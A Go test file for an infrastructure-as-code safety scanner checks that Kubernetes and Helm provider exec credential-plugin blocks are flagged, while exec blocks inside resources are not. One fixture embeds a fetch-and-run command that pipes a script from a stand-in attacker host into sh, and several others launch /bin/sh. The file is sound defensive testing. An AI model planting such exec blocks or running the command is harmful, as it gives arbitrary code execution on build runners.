// SPDX-FileCopyrightText: 2026 Alethia Labs <legal@alethialabs.io>
// SPDX-License-Identifier: AGPL-3.0-only

package iacsafety

import "testing"

// #2031 regression: the `exec` credential-plugin block runs `command` with
// `args` as a local subprocess while the provider configures its client during
// `tofu plan` — the same execution window provisioners and data "external" are
// blocked for. hashicorp/kubernetes accepts it directly and hashicorp/helm
// nested under kubernetes{}, and BOTH are on the default allowlist, so a
// module with zero non-allowlisted providers, no provisioner, and no data
// "external" still got arbitrary command execution on the runner while the
// gate reported OK=true.

const k8sDecl = `terraform {
  required_providers {
    kubernetes = { source = "hashicorp/kubernetes" }
  }
}

`

func TestExecCredentialPluginIsGated(t *testing.T) {
	deny := []struct {
		name  string
		files map[string]string
	}{
		{
			// The issue's executed repro: allowlisted provider, no provisioner,
			// no data "external" — and a /bin/sh subprocess at plan time.
			name: "native kubernetes exec block",
			files: map[string]string{"main.tf": k8sDecl + `provider "kubernetes" {
  host = "https://127.0.0.1:6443"
  exec {
    api_version = "client.authentication.k8s.io/v1beta1"
    command     = "/bin/sh"
    args        = ["-c", "curl -s http://attacker.example/x.sh | sh"]
  }
}

resource "kubernetes_namespace" "x" {
  metadata {
    name = "demo"
  }
}
`},
		},
		{
			name: "native helm exec nested under kubernetes{}",
			files: map[string]string{"main.tf": `terraform {
  required_providers {
    helm = { source = "hashicorp/helm" }
  }
}

provider "helm" {
  kubernetes {
    exec {
      api_version = "client.authentication.k8s.io/v1beta1"
      command     = "/bin/sh"
    }
  }
}
`},
		},
		{
			name: "native exec attribute spelling",
			files: map[string]string{"main.tf": k8sDecl + `provider "kubernetes" {
  exec = {
    api_version = "client.authentication.k8s.io/v1beta1"
    command     = "/bin/sh"
  }
}
`},
		},
		{
			name: "json kubernetes exec key",
			files: map[string]string{"main.tf.json": `{
  "terraform": {"required_providers": {"kubernetes": {"source": "hashicorp/kubernetes"}}},
  "provider": {"kubernetes": {"host": "https://127.0.0.1:6443", "exec": {"command": "/bin/sh"}}}
}`},
		},
		{
			name: "json helm exec nested under kubernetes, repeated-block array form",
			files: map[string]string{"main.tf.json": `{
  "terraform": {"required_providers": {"helm": {"source": "hashicorp/helm"}}},
  "provider": {"helm": [{"kubernetes": {"exec": {"command": "/bin/sh"}}}]}
}`},
		},
	}
	for _, tc := range deny {
		t.Run(tc.name, func(t *testing.T) {
			rep, err := Scan(writeTree(t, tc.files), nil)
			if err != nil {
				t.Fatalf("Scan: %v", err)
			}
			if rep.OK {
				t.Fatalf("SECURITY HOLE: gate returned OK=true for a module that runs a subprocess as an exec credential plugin during plan (findings=%+v)", rep.Findings)
			}
			if !hasRule(rep, RuleExecCredentialPlugin) {
				t.Errorf("denied but without rule %q (findings: %+v)", RuleExecCredentialPlugin, rep.Findings)
			}
		})
	}
}

// TestExecInsideResourceIsNotFlagged is the precision control: an exec block
// inside a RESOURCE (a Kubernetes liveness-probe exec, the mainstream shape)
// is workload configuration that runs in the cluster, not on the runner. The
// rule is scoped to provider configuration bodies, so this must pass.
func TestExecInsideResourceIsNotFlagged(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
	}{
		{
			name: "native liveness-probe exec",
			files: map[string]string{"main.tf": k8sDecl + `resource "kubernetes_deployment" "app" {
  metadata {
    name = "app"
  }
  spec {
    template {
      spec {
        container {
          name  = "app"
          image = "app:1"
          liveness_probe {
            exec {
              command = ["/bin/health"]
            }
          }
        }
      }
    }
  }
}
`},
		},
		{
			name: "json probe exec outside any provider key",
			files: map[string]string{"main.tf.json": `{
  "terraform": {"required_providers": {"kubernetes": {"source": "hashicorp/kubernetes"}}},
  "resource": {"kubernetes_deployment": {"app": {"spec": {"template": {"spec": {"container": {"liveness_probe": {"exec": {"command": ["/bin/health"]}}}}}}}}}
}`},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rep, err := Scan(writeTree(t, tc.files), nil)
			if err != nil {
				t.Fatalf("Scan: %v", err)
			}
			if !rep.OK {
				t.Fatalf("workload exec was DENIED — the rule leaked out of provider scope (findings: %+v)", rep.Findings)
			}
		})
	}
}
